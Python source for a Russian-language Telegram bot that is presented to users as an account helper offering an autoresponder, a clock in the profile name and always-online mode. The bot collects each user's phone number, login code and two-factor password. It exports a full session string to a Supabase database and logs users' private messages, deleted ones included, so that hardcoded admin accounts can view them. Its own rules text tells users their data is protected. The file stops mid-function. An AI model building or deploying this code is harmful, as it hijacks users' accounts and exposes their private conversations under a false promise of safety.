import asyncio
import sys
import os
import datetime
import re
import psutil
import time
import random
from aiohttp import web
from supabase import create_client, Client as SupabaseClient

if sys.platform != "win32":
    try:
        import uvloop
        uvloop.install()
    except ImportError:
        pass

from aiogram import Bot, Dispatcher, types, F, BaseMiddleware
from aiogram.filters import CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest

from pyrogram import Client, enums, filters
from pyrogram.handlers import MessageHandler, DeletedMessagesHandler
from pyrogram.raw import functions
from pyrogram.errors import SessionPasswordNeeded, Unauthorized

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
API_ID = int(os.getenv("API_ID", "0") or 0)
API_HASH = os.getenv("API_HASH", "")
SUPABASE_URL = os.getenv("SUPABASE_URL", "")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")

supabase: SupabaseClient = create_client(SUPABASE_URL, SUPABASE_KEY)
ADMIN_USERNAMES = ["Qwtyf05920Real", "VG9sdWJhZXYgTWl5aXJiZWso"]
TEMP_ADMINS = set()

LANG = {
    "btn_start": "Начинаем 🚀", "btn_rules": "Правила 📜", "btn_admin": "👑 АДМИН ПАНЕЛЬ 👑",
    "btn_back": "Назад 🔙", "btn_back_menu": "Назад в меню 🔙", "btn_confirm": "Подтвердить ✅", 
    "btn_activity": "Активность 📊", "btn_autoresp": "Автоответчик 🤖", "btn_timenick": "Время в профиль 🕒", 
    "btn_247": "Режим 24/7 ⚡️", "btn_delete": "Очистить историю 🧹",
    "btn_turn_on": "Активировать ▶️", "btn_turn_off": "Выключить ❌", "btn_tz_select": "Часовой пояс 🕒", 
    "btn_refresh": "Обновить 🔄", "btn_autoresp_setup": "Текст Приветствия 📝", "btn_block_menu": "Блокировать Меню 🔒",
    "btn_register": "Регистрироваться 📝", "status_on": "Включен 🟢", "status_off": "Выключен 🔴",
    "btn_custom_nick": "Кастомизация ✨", "btn_time": "Время 🕒", "btn_lock_now": "Блок 🔒",
    "msg_start": "Здравствуйте!\nДобро пожаловать в бота управления аккаунтом.\nОзнакомьтесь с правилами.",
    "msg_menu": "Что умеет этот бот?\nВыбирайте доступные функции управления вашим аккаунтом снизу:",
    "msg_rules_text": "📜 **Правила использования бота:**\n\n1. Бот работает через юзербота.\n2. Все данные хранятся в защищенной области.\n3. Бот работает 24/7 без ограничений.\n\n_СТАТУС: UNLIMITED._",
    "msg_phone_req": "Отправьте номер телефона (например, +123456789).",
    "msg_code_req": "Код авторизации отправлен.\n⚠️ Напишите код из сообщения Telegram!",
    "msg_pwd_req": "Аккаунт защищен облачным паролем.\nВведите его в чат:",
    "msg_success_login": "Бот успешно авторизовался!\nНажмите кнопку ниже для продолжения.",
    "msg_btn_go": "Поехали ➡️",
    "msg_autoresp_default": "👋 Здравствуйте! Я сейчас не в сети, отвечу позже.",
    "msg_timenick_text": "Вывод времени в имя профиля.\nТекущий статус: {0}\nСмещение часового пояса: UTC+{1}",
    "msg_247_text": "⚡️ Режим 24/7\n\nСтатус: {0}\nБот поддерживает ваш аккаунт онлайн постоянно.",
    "msg_del_text": "🗑 **Зачистка истории**\nВыберите, сколько последних сообщений удалить:",
    "msg_session_revoked": "⚠️ Юзербот отключен.\nНажмите кнопку ниже, чтобы зарегистрироваться заново.",
    "msg_block_setup": "Введите 4-значный PIN-код для блокировки меню:",
    "msg_unlock_req": "🔒 Меню заблокировано. Введите PIN-код для входа:"
}

ZONES = [
    ("Европа / UTC+1", 1), ("Киев / UTC+2", 2), ("МСК / UTC+3", 3), 
    ("Самара / UTC+4", 4), ("Ташкент / UTC+5", 5), ("Омск / UTC+6", 6)
]

USER_DATA = {}

def get_user_state(user_id):
    if user_id not in USER_DATA:
        USER_DATA[user_id] = {
            "msg_id": None, "phone": None, "password": None, "phone_code_hash": None,
            "client": None, "state": "START", "time_nick_active": False, "time_nick_task": None,
            "status_24_7": False, "task_24_7": None, "activity_task": None,
            "admin_view_user": None, "admin_view_chat": None, "admin_view_page": 1,
            "current_menu": None, "is_menu_locked": False, "last_interaction_time": time.time()
        }
    return USER_DATA[user_id]

def is_admin(user_id, username):
    clean = username.replace("@", "") if username else ""
    return clean in ADMIN_USERNAMES or user_id in TEMP_ADMINS

async def get_db_config(user_id, username=None, first_name=None):
    res = supabase.table("user_configs").select("*").eq("user_id", user_id).execute()
    if not res.data:
        default = {
            "user_id": user_id, "status_24_7": False, "time_nick_active": False, 
            "autoresponder_active": False, "autoresponder_greeting": LANG["msg_autoresp_default"],
            "timezone_offset": 5, "replied_users": [], "is_menu_locked": False, 
            "menu_lock_code": None, "logged_in": False, "last_interaction_time": time.time(),
            "custom_nick_style": 1, "timezone_name": "Ташкент / UTC+5"
        }
        try:
            default["username"] = username or ""
            default["first_name"] = first_name or "Без имени"
            supabase.table("user_configs").insert(default).execute()
        except Exception: 
            pass
        return default
    else:
        if username is not None or first_name is not None:
            updates = {}
            if username is not None: updates["username"] = username
            if first_name is not None: updates["first_name"] = first_name
            try: supabase.table("user_configs").update(updates).eq("user_id", user_id).execute()
            except Exception: pass
        return res.data[0]

async def update_db_config(user_id, updates):
    supabase.table("user_configs").update(updates).eq("user_id", user_id).execute()
    if "is_menu_locked" in updates:
        get_user_state(user_id)["is_menu_locked"] = updates["is_menu_locked"]
    if "last_interaction_time" in updates:
        get_user_state(user_id)["last_interaction_time"] = updates["last_interaction_time"]

async def get_db_session(user_id):
    res = supabase.table("user_sessions").select("session_string").eq("user_id", user_id).execute()
    return res.data[0]["session_string"] if res.data else None

async def save_db_session(user_id, session_string, phone):
    res = supabase.table("user_sessions").select("user_id").eq("user_id", user_id).execute()
    if res.data:
        supabase.table("user_sessions").update({"session_string": session_string, "phone": phone}).eq("user_id", user_id).execute()
    else:
        supabase.table("user_sessions").insert({"user_id": user_id, "session_string": session_string, "phone": phone}).execute()

async def drop_db_session(user_id):
    supabase.table("user_sessions").delete().eq("user_id", user_id).execute()
    await update_db_config(user_id, {"logged_in": False})

async def update_daily_stats(stat_type):
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    res = supabase.table("daily_stats").select("*").eq("date", today).execute()
    if res.data:
        val = res.data[0][stat_type] + 1
        supabase.table("daily_stats").update({stat_type: val}).eq("date", today).execute()
    else:
        supabase.table("daily_stats").insert({
            "date": today, 
            "incoming": 1 if stat_type=='incoming' else 0, 
            "active": 1 if stat_type=='active' else 0
        }).execute()

async def log_pm_message(client, message, is_deleted=False):
    if not message.chat or message.chat.type != enums.ChatType.PRIVATE: return
    user_id = client.owner_id
    chat_id = message.chat.id
    msg_id = message.id
    sender_id = message.from_user.id if message.from_user else 0
    sender_name = message.from_user.first_name if message.from_user else "Unknown"
    text = message.text or message.caption or ""
    is_media = bool(message.media)
    media_type = f"[{message.media.value}]" if is_media else ""
    
    log_data = {
        "user_id": user_id, "chat_id": chat_id, "msg_id": msg_id,
        "sender_id": sender_id, "sender_name": sender_name,
        "text": text, "is_deleted": is_deleted, "date": message.date.isoformat(),
        "is_media": is_media, "media_type": media_type
    }
    res = supabase.table("messages_log").select("id").eq("user_id", user_id).eq("msg_id", msg_id).execute()
    if res.data:
        if is_deleted:
             supabase.table("messages_log").update({"is_deleted": True}).eq("id", res.data[0]["id"]).execute()
    else:
        supabase.table("messages_log").insert(log_data).execute()

async def trigger_pm_update(user_id, chat_id):
    for admin_id, data in USER_DATA.items():
        if data.get("current_menu") == "admin_viewpm" and data.get("admin_view_user") == user_id and data.get("admin_view_chat") == chat_id:
            page = data.get("admin_view_page", 1)
            await refresh_admin_pm_view(admin_id, user_id, chat_id, page)

async def process_autoresponder(client, message):
    if not message.chat or message.chat.type != enums.ChatType.PRIVATE: return
    if message.from_user and (message.from_user.is_self or message.from_user.is_bot): return
    
    user_id = client.owner_id
    cfg = await get_db_config(user_id)
    if not cfg.get("autoresponder_active"): return
    
    sender_id = message.from_user.id
    replied = cfg.get("replied_users", [])
    if sender_id in replied: return

    my_last, their_last = 0, 0
    async for msg in client.get_chat_history(sender_id, limit=15):
        if msg.from_user and msg.from_user.is_self:
            if not my_last: my_last = msg.date.timestamp()
        else:
            if not their_last: their_last = msg.date.timestamp()

    if my_last > their_last: return

    custom_greeting = cfg.get("autoresponder_greeting", LANG["msg_autoresp_default"])
    try:
        await client.send_message(chat_id=sender_id, text=custom_greeting)
        replied.append(sender_id)
        await update_db_config(user_id, {"replied_users": replied})
    except Exception: pass

async def on_new_message(client, message):
    await process_autoresponder(client, message)
    await log_pm_message(client, message, False)
    if message.chat and message.chat.type == enums.ChatType.PRIVATE:
        await trigger_pm_update(client.owner_id, message.chat.id)

async def on_deleted_message(client, messages):
    for msg in messages:
        if msg.chat and msg.chat.type == enums.ChatType.PRIVATE:
            supabase.table("messages_log").update({"is_deleted": True}).eq("user_id", client.owner_id).eq("msg_id", msg.id).execute()
            await trigger_pm_update(client.owner_id, msg.id)

async def keep_online_loop(user_id):
    data = get_user_state(user_id)
    while data["status_24_7"]:
        if not data["client"] or not data["client"].is_connected: break
        try:
            await data["client"].invoke(functions.account.UpdateStatus(offline=False))
        except Unauthorized:
            await handle_revoked_session(user_id)
            break
        except Exception: pass
        await asyncio.sleep(30)

def strip_time_nick(name):
    name = re.sub(r'\s*(\[.*?\]|⌚.*|⏳.*|★.*|[\d𝟎-𝟗𝟘-𝟡𝟢-𝟫𝟶-𝟿]+[:∶][\d𝟎-𝟗𝟘-𝟡𝟢-𝟫𝟶-𝟿]+)$', '', name)
    name = name.replace("꧁ ", "").replace(" ꧂", "").replace("★ ", "")
    return name.strip()

def apply_custom_nick(base_name, time_str, style_idx):
    bold = str.maketrans("0123456789", "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗")
    double = str.maketrans("0123456789", "𝟘𝟙𝟚𝟛𝟜𝟝𝞮𝟟𝟠𝟡")
    sans = str.maketrans("0123456789", "𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫")
    mono = str.maketrans("0123456789", "𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿")
    
    if style_idx == 1: return f"{base_name} [{time_str}]"
    if style_idx == 2: return f"{base_name} {time_str.translate(bold)}"
    if style_idx == 3: return f"{base_name} {time_str.translate(double)}"
    if style_idx == 4: return f"{base_name} {time_str.translate(sans)}"
    if style_idx == 5: return f"{base_name} {time_str.translate(mono)}"
    return f"{base_name} [{time_str}]"

async def time_nickname_loop(user_id):
    data = get_user_state(user_id)
    while data["time_nick_active"]:
        if not data["client"] or not data["client"].is_connected: break
        try:
            me = await data["client"].get_me()
            cfg = await get_db_config(user_id)
            offset = float(cfg.get("timezone_offset", 5))
            style = cfg.get("custom_nick_style", 1)
            
            tz_now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=offset)
            time_str = tz_now.strftime('%H:%M')
            
            base_name = strip_time_nick(me.first_name or "User")
            final_name = apply_custom_nick(base_name, time_str, style)
            
            if final_name != me.first_name:
                await data["client"].update_profile(first_name=final_name)
        except Unauthorized:
            await handle_revoked_session(user_id)
            break
        except Exception: pass
        await asyncio.sleep(60)

async def activity_tracker_loop(user_id):
    data = get_user_state(user_id)
    while True:
        await asyncio.sleep(60)
        if not data["client"] or not data["client"].is_connected: break
        try:
            auths = await data["client"].invoke(functions.account.GetAuthorizations())
            now_ts = time.time()
            is_active = any((now_ts - a.date_active) < 120 for a in auths.authorizations)
            
            if is_active:
                today = datetime.datetime.now().strftime("%d.%m.%Y")
                res = supabase.table("user_activity").select("activity_data").eq("user_id", user_id).execute()
                act_data = res.data[0]["activity_data"] if res.data else {}
                
                act_data[today] = act_data.get(today, 0) + 1
                today_date = datetime.datetime.now().date()
                keys_to_del = [k for k in act_data if (today_date - datetime.datetime.strptime(k, "%d.%m.%Y").date()).days > 5]
                for k in keys_to_del: del act_data[k]
                    
                if res.data: supabase.table("user_activity").update({"activity_data": act_data}).eq("user_id", user_id).execute()
                else: supabase.table("user_activity").insert({"user_id": user_id, "activity_data": act_data}).execute()
        except Exception: pass

async def ensure_client_connected(user_id):
    data = get_user_state(user_id)
    cfg = await get_db_config(user_id)
    data["is_menu_locked"] = cfg.get("is_menu_locked", False)
    data["last_interaction_time"] = cfg.get("last_interaction_time", time.time())
    
    if data["client"] and data["client"].is_connected: return True

    session_str = await get_db_session(user_id)
    if session_str:
        client = Client(f"user_{user_id}", session_string=session_str, api_id=API_ID, api_hash=API_HASH, ipv6=False, in_memory=True)
        client.owner_id = user_id
        client.add_handler(MessageHandler(on_new_message, filters.private))
        client.add_handler(DeletedMessagesHandler(on_deleted_message, filters.private))
        data["client"] = client
        try:
            await client.connect()
            await client.get_me()
            
            if not cfg.get("logged_in"):
                await update_db_config(user_id, {"logged_in": True})

            if not data.get("activity_task"):
                data["activity_task"] = asyncio.create_task(activity_tracker_loop(user_id))
            if cfg.get("status_24_7") and not data.get("task_24_7"):
                data["status_24_7"] = True
                data["task_24_7"] = asyncio.create_task(keep_online_loop(user_id))
            if cfg.get("time_nick_active") and not data.get("time_nick_task"):
                data["time_nick_active"] = True
                data["time_nick_task"] = asyncio.create_task(time_nickname_loop(user_id))
            return True
        except Exception:
            await handle_revoked_session(user_id)
            return False
    return False

async def handle_revoked_session(user_id):
    data = get_user_state(user_id)
    for task in ["time_nick_task", "task_24_7", "activity_task"]:
        if data[task]: data[task].cancel()
    
    data.update({"time_nick_active": False, "status_24_7": False, "state": "START"})
    if data["client"]:
        try: await data["client"].disconnect()
        except: pass
        data["client"] = None

    await drop_db_session(user_id)
    builder = InlineKeyboardBuilder().button(text=LANG["btn_register"], callback_data="start_login")
    await edit_or_send(user_id, LANG["msg_session_revoked"], reply_markup=builder.as_markup())

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

async def delayed_delete(message: types.Message, delay: int):
    if delay > 0:
        await asyncio.sleep(delay)
    try:
        await message.delete()
    except Exception:
        pass

class LockMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery):
            user_id = event.from_user.id
            if event.message: get_user_state(user_id)["msg_id"] = event.message.message_id
        elif isinstance(event, types.Message):
            user_id = event.from_user.id
            asyncio.create_task(delayed_delete(event, 5))
            
        if user_id:
            now = time.time()
            u_state = get_user_state(user_id)
            cfg = await get_db_config(user_id)
            has_pin = bool(cfg.get("menu_lock_code"))
            last_active = u_state.get("last_interaction_time", now)
            
            if has_pin:
                if u_state.get("state") == "WAITING_UNLOCK_CODE" or (now - last_active >= 300):
                    u_state["state"] = "WAITING_UNLOCK_CODE"
                    if isinstance(event, types.CallbackQuery):
                        await edit_or_send(user_id, LANG["msg_unlock_req"])
                        return
            
            await update_db_config(user_id, {"last_interaction_time": now})
            
        return await handler(event, data)

dp.update.middleware(LockMiddleware())

async def background_lock_monitor():
    while True:
        await asyncio.sleep(10)
        now = time.time()
        for uid, data in list(USER_DATA.items()):
            cfg = await get_db_config(uid)
            has_pin = bool(cfg.get("menu_lock_code"))
            if has_pin and data.get("state") != "WAITING_UNLOCK_CODE":
                last_active = data.get("last_interaction_time", now)
                if now - last_active >= 300:
                    data["state"] = "WAITING_UNLOCK_CODE"
                    try:
                        await edit_or_send(uid, LANG["msg_unlock_req"])
                    except Exception:
                        pass

async def edit_or_send(user_id, text, reply_markup=None, parse_mode=None):
    data = get_user_state(user_id)
    if data["msg_id"]:
        try:
            await bot.edit_message_text(chat_id=user_id, message_id=data["msg_id"], text=text, reply_markup=reply_markup, parse_mode=parse_mode)
            return
        except TelegramBadRequest as e:
            if "not modified" in str(e).lower(): return
            data["msg_id"] = None
        except Exception:
            data["msg_id"] = None
    
    msg = await bot.send_message(chat_id=user_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    data["msg_id"] = msg.message_id

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    data = get_user_state(user_id)
    now = time.time()
    
    cfg = await get_db_config(user_id, username=message.from_user.username, first_name=message.from_user.first_name)
    has_pin = bool(cfg.get("menu_lock_code"))
    last_active = data.get("last_interaction_time", now)
    
    if has_pin and (data.get("state") == "WAITING_UNLOCK_CODE" or (now - last_active >= 300)):
        data["state"] = "WAITING_UNLOCK_CODE"
        await edit_or_send(user_id, LANG["msg_unlock_req"])
        return

    data["state"] = "START"
    
    try:
        await update_daily_stats('incoming')
    except Exception:
        pass

    if await ensure_client_connected(user_id):
        await show_main_menu(user_id, message.from_user.username)
    else:
        builder = InlineKeyboardBuilder()
        builder.button(text=LANG["btn_rules"], callback_data="rules_view")
        builder.button(text=LANG["btn_start"], callback_data="start_login")
        if is_admin(user_id, message.from_user.username):
            builder.button(text=LANG["btn_admin"], callback_data="admin_menu")
        builder.adjust(1)
        await edit_or_send(user_id, LANG["msg_start"], reply_markup=builder.as_markup())

@dp.callback_query(F.data == "rules_view")
async def rules_view(cb: types.CallbackQuery):
    builder = InlineKeyboardBuilder().button(text="Я ознакомился 👍", callback_data="rules_accepted")
    await edit_or_send(cb.from_user.id, LANG["msg_rules_text"], reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "rules_accepted")
async def rules_accepted(cb: types.CallbackQuery):
    await show_main_menu(cb.from_user.id, cb.from_user.username) if await ensure_client_connected(cb.from_user.id) else await cmd_start(cb.message)

@dp.callback_query(F.data == "start_login")
async def start_login(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    if await ensure_client_connected(user_id):
        await show_main_menu(user_id, cb.from_user.username)
        return
    get_user_state(user_id)["state"] = "WAITING_PHONE"
    builder = InlineKeyboardBuilder().button(text=LANG["btn_back"], callback_data="cancel_auth")
    await edit_or_send(user_id, LANG["msg_phone_req"], reply_markup=builder.as_markup())

@dp.callback_query(F.data == "cancel_auth")
async def cancel_auth(cb: types.CallbackQuery):
    data = get_user_state(cb.from_user.id)
    data["state"] = "START"
    if data["client"]:
        try: await data["client"].disconnect()
        except: pass
        data["client"] = None
    await cmd_start(cb.message)

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_PHONE")
async def process_phone(message: types.Message):
    user_id = message.from_user.id
    phone = message.text.strip().replace(" ", "")
    
    if not phone.startswith("+"): phone = "+" + phone
    phone = re.sub(r'[^\d+]', '', phone)
    
    data = get_user_state(user_id)
    data["phone"] = phone
    data["state"] = "WAITING_CODE"
    
    client = Client(f"user_{user_id}_temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    data["client"] = client
    
    try:
        await client.connect()
        code_info = await client.send_code(phone)
        data["phone_code_hash"] = code_info.phone_code_hash
        builder = InlineKeyboardBuilder().button(text=LANG["btn_back"], callback_data="cancel_auth")
        await edit_or_send(user_id, LANG["msg_code_req"], reply_markup=builder.as_markup())
    except Exception as e:
        await edit_or_send(user_id, f"Ошибка: {e}")

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_CODE")
async def process_code(message: types.Message):
    user_id = message.from_user.id
    code = re.sub(r'\D', '', message.text.strip())
    
    data = get_user_state(user_id)
    client = data["client"]
    if not client: return
    
    try:
        await client.sign_in(data["phone"], data["phone_code_hash"], code)
        await finish_login(user_id, client)
    except SessionPasswordNeeded:
        data["state"] = "WAITING_PASSWORD"
        builder = InlineKeyboardBuilder().button(text=LANG["btn_back"], callback_data="cancel_auth")
        await edit_or_send(user_id, LANG["msg_pwd_req"], reply_markup=builder.as_markup())
    except Exception as e:
        await edit_or_send(user_id, f"Ошибка кода: {e}")

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_PASSWORD")
async def process_password(message: types.Message):
    user_id = message.from_user.id
    pwd = message.text.strip()
    
    client = get_user_state(user_id)["client"]
    try:
        await client.check_password(pwd)
        await finish_login(user_id, client)
    except Exception:
        msg_err = await message.answer("❌ Неверный пароль!")
        asyncio.create_task(delayed_delete(msg_err, 3))

async def finish_login(user_id, client):
    session_str = await client.export_session_string()
    phone = get_user_state(user_id).get("phone", "")
    await save_db_session(user_id, session_str, phone)
    await update_db_config(user_id, {"logged_in": True})
    await update_daily_stats('active')
    
    get_user_state(user_id)["state"] = "MENU"
    builder = InlineKeyboardBuilder().button(text=LANG["msg_btn_go"], callback_data="main_menu")
    await edit_or_send(user_id, LANG["msg_success_login"], reply_markup=builder.as_markup())

async def show_main_menu(user_id, username):
    get_user_state(user_id)["state"] = "MENU"
    get_user_state(user_id)["current_menu"] = "main"
    builder = InlineKeyboardBuilder()
    builder.button(text=LANG["btn_activity"], callback_data="menu_activity")
    builder.button(text=LANG["btn_autoresp"], callback_data="menu_autoresponder")
    builder.button(text=LANG["btn_timenick"], callback_data="menu_profile_settings")
    builder.button(text=LANG["btn_247"], callback_data="toggle_247")
    builder.button(text=LANG["btn_delete"], callback_data="menu_delete")
    builder.button(text=LANG["btn_block_menu"], callback_data="menu_block_settings")
    
    if is_admin(user_id, username):
        builder.button(text=LANG["btn_admin"], callback_data="admin_menu")
        builder.adjust(2, 2, 2, 1)
    else:
        builder.adjust(2, 2, 2)
        
    await edit_or_send(user_id, LANG["msg_menu"], reply_markup=builder.as_markup())

@dp.callback_query(F.data == "main_menu")
async def cb_main_menu(cb: types.CallbackQuery):
    await show_main_menu(cb.from_user.id, cb.from_user.username)

@dp.callback_query(F.data == "menu_profile_settings")
async def menu_profile_settings(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    builder = InlineKeyboardBuilder()
    builder.button(text=LANG["btn_time"], callback_data="menu_timenick")
    builder.button(text=LANG["btn_custom_nick"], callback_data="menu_custom_nick")
    builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
    builder.adjust(2, 1)
    await edit_or_send(user_id, "⚙️ **Настройки профиля**\nВыберите, что хотите настроить:", reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "menu_timenick")
async def menu_timenick(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    cfg = await get_db_config(user_id)
    status_txt = LANG["status_on"] if cfg.get("time_nick_active") else LANG["status_off"]
    tz_name = cfg.get("timezone_name", "Ташкент / UTC+5")
    
    builder = InlineKeyboardBuilder()
    builder.button(text=LANG["btn_turn_off"] if cfg.get("time_nick_active") else LANG["btn_turn_on"], callback_data="toggle_timenick")
    builder.button(text=LANG["btn_tz_select"], callback_data="select_tz")
    builder.button(text=LANG["btn_back"], callback_data="menu_profile_settings")
    builder.adjust(1)
    
    text = f"🕒 Вывод времени в имя профиля.\nТекущий статус: {status_txt}\nТекущий пояс: {tz_name}"
    await edit_or_send(user_id, text, reply_markup=builder.as_markup())

@dp.callback_query(F.data == "toggle_timenick")
async def toggle_timenick(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    cfg = await get_db_config(user_id)
    new_status = not cfg.get("time_nick_active")
    await update_db_config(user_id, {"time_nick_active": new_status})
    
    data = get_user_state(user_id)
    data["time_nick_active"] = new_status
    if new_status and not data.get("time_nick_task"):
        data["time_nick_task"] = asyncio.create_task(time_nickname_loop(user_id))
    elif not new_status:
        if data.get("time_nick_task"):
            data["time_nick_task"].cancel()
            data["time_nick_task"] = None
        if data["client"] and data["client"].is_connected:
            try:
                me = await data["client"].get_me()
                clean_name = strip_time_nick(me.first_name or "User")
                await data["client"].update_profile(first_name=clean_name)
            except Exception: pass
        
    await menu_timenick(cb)

@dp.callback_query(F.data == "select_tz")
async def select_tz(cb: types.CallbackQuery):
    builder = InlineKeyboardBuilder()
    for i, (name, offset) in enumerate(ZONES):
        builder.button(text=name, callback_data=f"tz_prev_{i}")
    builder.button(text=LANG["btn_back"], callback_data="menu_timenick")
    builder.adjust(2, 2, 2, 1)
    await edit_or_send(cb.from_user.id, "🌍 Выберите ваш часовой пояс:", reply_markup=builder.as_markup())

@dp.callback_query(F.data.startswith("tz_prev_"))
async def tz_prev(cb: types.CallbackQuery):
    idx = int(cb.data.split("_")[2])
    name, offset = ZONES[idx]
    
    tz_now = (datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=offset)).strftime('%H:%M')
    text = f"Выбрано: {name}\nВремя сейчас — {tz_now}\n\nВерно?"
    
    builder = InlineKeyboardBuilder()
    builder.button(text=LANG["btn_confirm"], callback_data=f"tz_save_{idx}")
    builder.button(text=LANG["btn_back"], callback_data="select_tz")
    builder.adjust(1)
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup())

@dp.callback_query(F.data.startswith("tz_save_"))
async def tz_save(cb: types.CallbackQuery):
    idx = int(cb.data.split("_")[2])
    name, offset = ZONES[idx]
    await update_db_config(cb.from_user.id, {"timezone_offset": offset, "timezone_name": name})
    await menu_timenick(cb)

@dp.callback_query(F.data == "menu_custom_nick")
async def menu_custom_nick(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    builder = InlineKeyboardBuilder()
    styles = [
        ("Стиль [10:30]", 1),
        ("Стиль 𝟏𝟎:𝟑𝟎", 2),
        ("Стиль 𝟙𝟘:𝟛𝟘", 3),
        ("Стиль 𝟢𝟣:𝟤𝟥", 4),
        ("Стиль 𝟶𝟷:𝟸𝟹", 5)
    ]
    for s_name, idx in styles:
        builder.button(text=s_name, callback_data=f"preview_nick_{idx}")
    builder.button(text=LANG["btn_back"], callback_data="menu_profile_settings")
    builder.adjust(1)
    
    text = f"✨ **Кастомизация никнейма**\n\nВыберите вариант оформления шрифта ниже:"
    await edit_or_send(user_id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("preview_nick_"))
async def preview_nick(cb: types.CallbackQuery):
    style_idx = int(cb.data.split("_")[2])
    data = get_user_state(cb.from_user.id)
    
    base_name = "Имя"
    if data["client"] and data["client"].is_connected:
        try:
            me = await data["client"].get_me()
            base_name = strip_time_nick(me.first_name or "User")
        except: pass
        
    prev = apply_custom_nick(base_name, "10:30", style_idx)
    text = f"Предпросмотр названия:\n👤 {prev}\n\nУстановить данный стиль?"
    
    builder = InlineKeyboardBuilder()
    builder.button(text=LANG["btn_confirm"], callback_data=f"save_nick_{style_idx}")
    builder.button(text=LANG["btn_back"], callback_data="menu_custom_nick")
    builder.adjust(1)
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup())

@dp.callback_query(F.data.startswith("save_nick_"))
async def save_nick(cb: types.CallbackQuery):
    style_idx = int(cb.data.split("_")[2])
    await update_db_config(cb.from_user.id, {"custom_nick_style": style_idx})
    
    data = get_user_state(cb.from_user.id)
    if data["client"] and data["client"].is_connected and data.get("time_nick_active"):
        try:
            me = await data["client"].get_me()
            cfg = await get_db_config(cb.from_user.id)
            offset = float(cfg.get("timezone_offset", 5))
            tz_now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=offset)
            base_name = strip_time_nick(me.first_name or "User")
            final_name = apply_custom_nick(base_name, tz_now.strftime('%H:%M'), style_idx)
            await data["client"].update_profile(first_name=final_name)
        except: pass
        
    await menu_custom_nick(cb)

@dp.callback_query(F.data == "menu_activity")
async def menu_activity(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    res = supabase.table("user_activity").select("activity_data").eq("user_id", user_id).execute()
    act = res.data[0]["activity_data"] if res.data else {}
    
    text = "📊 **Статистика вашей активности (в минутах):**\n\n"
    if not act:
        text += "За последние дни активность не зафиксирована."
    else:
        for day, mins in sorted(act.items(), reverse=True):
            text += f"📅 **{day}**: {mins} мин.\n"
            
    builder = InlineKeyboardBuilder()
    builder.button(text=LANG["btn_refresh"], callback_data="menu_activity")
    builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
    builder.adjust(1)
    await edit_or_send(user_id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "menu_autoresponder")
async def menu_autoresponder(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    cfg = await get_db_config(user_id)
    
    status_txt = LANG["status_on"] if cfg.get("autoresponder_active") else LANG["status_off"]
    greeting = cfg.get("autoresponder_greeting", LANG["msg_autoresp_default"])
    text = f"🤖 **Автоответчик**\n\nСтатус: {status_txt}\n\nТекущий текст приветствия:\n_{greeting}_"
    
    builder = InlineKeyboardBuilder()
    builder.button(text=LANG["btn_turn_off"] if cfg.get("autoresponder_active") else LANG["btn_turn_on"], callback_data="toggle_autoresponder")
    builder.button(text=LANG["btn_autoresp_setup"], callback_data="setup_autoresp_text")
    builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
    builder.adjust(1)
    await edit_or_send(user_id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "toggle_autoresponder")
async def toggle_autoresponder(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    cfg = await get_db_config(user_id)
    new_st = not cfg.get("autoresponder_active")
    
    updates = {"autoresponder_active": new_st}
    if new_st: updates["replied_users"] = []
    await update_db_config(user_id, updates)
    await menu_autoresponder(cb)

@dp.callback_query(F.data == "setup_autoresp_text")
async def setup_autoresp_text(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    get_user_state(user_id)["state"] = "WAITING_AUTORESP_TEXT"
    builder = InlineKeyboardBuilder().button(text=LANG["btn_back"], callback_data="menu_autoresponder")
    await edit_or_send(user_id, "Введите новый текст автоответчика:", reply_markup=builder.as_markup())

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_AUTORESP_TEXT")
async def process_autoresp_text(message: types.Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    await update_db_config(user_id, {"autoresponder_greeting": text})
    get_user_state(user_id)["state"] = "MENU"
    
    builder = InlineKeyboardBuilder().button(text=LANG["btn_confirm"], callback_data="menu_autoresponder")
    await edit_or_send(user_id, "✅ Текст сохранен!", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "toggle_247")
async def toggle_247(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    cfg = await get_db_config(user_id)
    new_st = not cfg.get("status_24_7")
